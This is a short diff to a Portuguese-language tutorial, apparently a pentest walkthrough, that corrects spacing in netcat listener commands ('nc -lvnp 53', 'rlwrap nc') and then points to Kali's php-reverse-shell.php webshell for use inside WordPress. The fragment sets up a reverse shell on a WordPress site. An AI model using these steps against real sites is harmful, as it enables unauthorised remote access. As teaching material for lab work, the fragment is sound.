@@ -89,10 +89,10 @@ Vale falar que você pode colocar a porta que preferir, eu geralmente utilizo 53
 
 (outras opções de uso - use o HELP do programa para ajudar e entender melhor o comando)
 nc -lvnp 53 
-nc -lp1234 -vv
+nc -lp 1234 -vv
 nc -lvnp 53 -vv
 rlwrap nc -lvnp 53 
-nc -lnp53 -vv
+nc -lnp 53 -vv
 
 Agora, vamos para a parte da ação dentro do wordpress.
 Podemos utilizar o 'php-rever-shell' que temos no kali: "/usr/share/webshells/php/php-reverse-shell.php"
